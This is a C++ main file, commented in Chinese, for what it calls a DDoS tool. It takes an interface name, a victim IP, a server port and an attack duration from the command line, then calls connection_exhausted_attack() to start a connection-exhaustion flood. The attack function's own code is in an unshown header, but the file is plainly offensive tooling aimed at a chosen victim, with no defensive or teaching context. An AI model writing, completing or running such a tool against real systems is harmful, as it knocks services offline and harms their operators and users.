#include <iostream>
#include "common.h"
#include "connection.h"

// globalArgs 初始化全局参数
GlobalArgs globalArgs = GlobalArgs();

// 解析命令行参数
void resolve_command_args(int argc, char** argv);

int main(int argc, char** argv) {

    // 解析命令行参数
    resolve_command_args(argc, argv);

    // 准备进行 ddos 攻击的发动
    connection_exhausted_attack();

    return 0;
}

// 解析命令行参数
void resolve_command_args(int argc, char** argv){
    if (argc != 5) {
        std::cout << "Error Parameters (1. interface name | 2. victim ip | 3. server port | 4. attack duration)" << std::endl;
        exit(-1);
    }
    CommandArgs commandArgs = CommandArgs(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]));
    globalArgs.initialize(commandArgs);
}